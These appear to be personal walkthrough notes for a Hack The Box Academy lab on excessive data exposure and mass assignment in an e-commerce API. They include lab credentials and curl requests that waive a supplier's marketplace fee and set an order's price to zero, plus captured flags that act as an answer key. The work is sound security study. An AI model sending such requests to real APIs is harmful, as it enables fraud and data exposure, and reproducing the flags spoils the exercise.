# Batch 03 — BOPLA: Excessive Data Exposure + Mass Assignment

## FILL IN

```bash
BASE="http://154.57.164.65:31687"
# Academy scenarios
C4_EMAIL="htbpentester4@hackthebox.com"; C4_PASS="HTBPentester4"   # EDE suppliers
C5_EMAIL="htbpentester5@hackthebox.com"; C5_PASS="HTBPentester5"   # EDE flag hunt
S6_EMAIL="htbpentester6@pentestercompany.com"; S6_PASS="HTBPentester6"  # mass assign fee
C7_EMAIL="htbpentester7@hackthebox.com"; C7_PASS="HTBPentester7"   # mass assign flag
```

## GOAL
Find **Broken Object Property Level Authorization**:

1. **Excessive Data Exposure** — response shows fields you should not see  
2. **Mass Assignment** — request lets you set fields you should not set  

## TIME
1–2 hours

## YOU NEED
- JWT for customer and/or supplier  
- `curl` + OpenAPI/Swagger  
- pinchtab optional for Swagger screenshot  

---

## WHY (30 seconds)

BOLA = wrong **object**.  
BOPLA = right object (or list), wrong **properties**.

| Subclass | CWE | Simple idea |
|----------|-----|-------------|
| **Excessive Data Exposure** | CWE-213 | API returns full DB model (email, phone, secrets) to a role that only needs public fields |
| **Mass Assignment** | CWE-915 | API binds every JSON key into the object; attacker sets `isAdmin`, prices, fees |

Kid picture:

- EDE = oversharing on the way **out**  
- Mass assignment = over-trusting on the way **in**

Fix both with **DTOs**: only the fields that role is allowed to read/write.

---

## DO THIS — Part A: Excessive Data Exposure

### A1) Login customer (p4)

```bash
JWT=$(curl -sk -X POST "$BASE/api/v1/authentication/customers/sign-in" \
  -H 'Content-Type: application/json' \
  -d "{\"Email\":\"$C4_EMAIL\",\"Password\":\"$C4_PASS\"}" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["jwt"])')
```

### A2) Roles

```bash
curl -sk -H "Authorization: Bearer $JWT" "$BASE/api/v1/roles/current-user"
# Lab: Suppliers_Get, Suppliers_GetAll
```

### A3) List suppliers — look for overshare

```bash
curl -sk -H "Authorization: Bearer $JWT" -H 'accept: application/json' \
  "$BASE/api/v1/suppliers" | python3 -m json.tool | head -40
```

**EDE if** response includes `email` / `phoneNumber` (or other sensitive) for suppliers while you are a **customer**.  
Marketplace impact: customers bypass platform and contact suppliers privately.

### A4) Flag hunt (p5) — enumerate “list all” GETs

```bash
JWT5=$(curl -sk -X POST "$BASE/api/v1/authentication/customers/sign-in" \
  -H 'Content-Type: application/json' \
  -d "{\"Email\":\"$C5_EMAIL\",\"Password\":\"$C5_PASS\"}" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["jwt"])')

# Roles often include more GetAll
curl -sk -H "Authorization: Bearer $JWT5" "$BASE/api/v1/roles/current-user"

for path in \
  /api/v1/suppliers \
  /api/v1/supplier-companies \
  /api/v1/customers/billing-addresses \
  /api/v1/products \
  /api/v1/products/discounts
do
  echo "=== $path ==="
  curl -sk -H "Authorization: Bearer $JWT5" "$BASE$path" | head -c 300; echo
done
# grep HTB{ in responses
```

Lab (p5):

| Endpoint | Sensitive leak |
|----------|----------------|
| `/api/v1/supplier-companies` | company emails incl. flag in HTB Academy row |
| `/api/v1/customers/billing-addresses` | full address book; flag in `street` |

### A5) Write

```text
EDE endpoints:
Sensitive fields:
```

---

## DO THIS — Part B: Mass Assignment

### B1) Login supplier (p6)

```bash
JWT6=$(curl -sk -X POST "$BASE/api/v1/authentication/suppliers/sign-in" \
  -H 'Content-Type: application/json' \
  -d "{\"Email\":\"$S6_EMAIL\",\"Password\":\"$S6_PASS\"}" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["jwt"])')
```

### B2) Read company before

```bash
curl -sk -H "Authorization: Bearer $JWT6" \
  "$BASE/api/v1/supplier-companies/current-user"
# note isExemptedFromMarketplaceFee: 0
# note company id Guid
```

### B3) PATCH sensitive field (academy)

Swagger body:

```json
{
  "UpdatedSupplierCompany": {
    "SupplierCompanyID": "YOUR-COMPANY-GUID",
    "IsExemptedFromMarketplaceFee": 1,
    "CertificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
  }
}
```

```bash
curl -sk -X PATCH "$BASE/api/v1/supplier-companies" \
  -H "Authorization: Bearer $JWT6" -H 'Content-Type: application/json' \
  -d '{"UpdatedSupplierCompany":{"SupplierCompanyID":"b75a7c76-e149-4ca7-9c55-d9fc4ffa87be","IsExemptedFromMarketplaceFee":1,"CertificateOfIncorporationPDFFileURI":"CompanyDidNotUploadYet"}}'
```

Re-GET current-user company → fee flag becomes **1**.

### B4) Flag mass assignment (p7 customer orders)

Roles: create order + order items. Item DTO includes **NetSum** (price) — client should not set real money.

```bash
JWT7=$(curl -sk -X POST "$BASE/api/v1/authentication/customers/sign-in" \
  -H 'Content-Type: application/json' \
  -d "{\"Email\":\"$C7_EMAIL\",\"Password\":\"$C7_PASS\"}" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["jwt"])')

# Create order
curl -sk -X POST "$BASE/api/v1/customers/orders" \
  -H "Authorization: Bearer $JWT7" -H 'Content-Type: application/json' \
  -d '{"Date":"2026-08-02"}'
# → {"id":"<order-guid>"}

# Get a product id
curl -sk -H "Authorization: Bearer $JWT7" "$BASE/api/v1/products" | head -c 200

# Mass-assign NetSum (should be server-priced)
curl -sk -X POST "$BASE/api/v1/customers/orders/items" \
  -H "Authorization: Bearer $JWT7" -H 'Content-Type: application/json' \
  -d '{"OrderID":"<order-guid>","OrderItems":[{"ProductID":"<product-guid>","Quantity":1,"NetSum":0}]}'
# Lab returns Message with HTB{...}
```

### B5) Write

```text
Mass-assign endpoint:
Forbidden field set:
Impact:
```

---

## EDGE CASES (real world)

| # | Test | Class |
|---|------|--------|
| E1 | Compare **UI fields** vs raw JSON keys | EDE |
| E2 | `?fields=` / GraphQL selection ignored → still full object | EDE |
| E3 | Admin-only fields on public list (`isExempted`, balances) | EDE |
| E4 | Nested objects overshare (orders → full card data) | EDE |
| E5 | Debug/stack in error still returns full entity | EDE |
| E6 | PATCH/POST with **extra** JSON properties | Mass assign |
| E7 | Bind `role`, `isAdmin`, `price`, `balance`, `verified` | Mass assign |
| E8 | Array inject extra objects | Mass assign |
| E9 | Read-only documented field still writable | Mass assign |
| E10 | Content-Type switch form↔JSON changes bind set | Mass assign |
| E11 | Hidden params in Swagger “example” vs real schema | both |
| E12 | Old API version `/v0` returns fatter DTO | EDE |
| E13 | Export CSV/PDF includes extra columns | EDE |
| E14 | Bulk update endpoints | Mass assign |
| E15 | gori/Burp: add properties in repeater not in UI | Mass assign |

---

## Prevention (report language)

- **Response DTO** per role — never serialize full domain entity to clients  
- **Request DTO** allowlist — never bind raw request to entity; ignore unknown fields  
- Server computes prices/fees; never trust client `NetSum` / exemption flags  

---

## IF / THEN

| You see | You do |
|---------|--------|
| Email/phone on “public” list | EDE finding + business impact |
| Client-set fee/price/role works | Mass assignment + impact |
| Need flag | Grep `HTB{` across all GetAll GETs; try writable money fields |

---

## Lab results (`154.57.164.65:31687`)

| Account | Finding |
|---------|---------|
| p4 customer | `/suppliers` returns email+phone (EDE) |
| p5 customer | `/supplier-companies` + `/customers/billing-addresses` overshare → flags |
| p6 supplier | PATCH `IsExemptedFromMarketplaceFee:1` succeeds |
| p7 customer | Order items `NetSum` client-controlled → flag in Message |

**Flags found:**

```text
EDE:  HTB{d759c70b5a9f6a392af78cc1eca9cdf0}
EDE:  HTB{1e2095c564baf0d2d316080217040dae}
Mass: HTB{4d86794f82046e465ca29d91bdbe5bca}
```

Evidence: `notes/inlanefreight-bopla/evidence/`

---

## NEXT
→ Unrestricted Resource Consumption / BFLA (later batches)

## OWASP / CWE

- API3:2023 Broken Object Property Level Authorization  
- CWE-213 Excessive Data Exposure  
- CWE-915 Mass Assignment  
